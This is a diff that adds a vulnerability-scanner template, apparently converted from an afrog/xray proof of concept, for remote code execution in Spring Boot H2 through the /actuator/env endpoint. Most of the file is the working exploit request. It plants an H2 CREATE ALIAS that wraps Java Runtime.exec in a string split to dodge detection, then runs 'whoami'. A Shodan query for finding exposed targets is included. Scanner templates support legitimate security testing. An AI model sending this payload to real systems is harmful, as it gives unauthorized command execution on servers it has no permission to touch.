@@ -1,0 +1,34 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      {
+        "name":"spring.datasource.hikari.connection-test-query",
+        "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
+      }
+    headers:
+      content-type: application/json
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT'
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/actuator/env'
+id: springboot-h2-db-rce
+info:
+  author: dwisiswant0
+  description: |
+    shodan-query: http.favicon.hash:116323821
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Spring Boot H2 Database RCE
+  severity: critical
+  tags: springboot,actuator,h2database,rce,argus-import
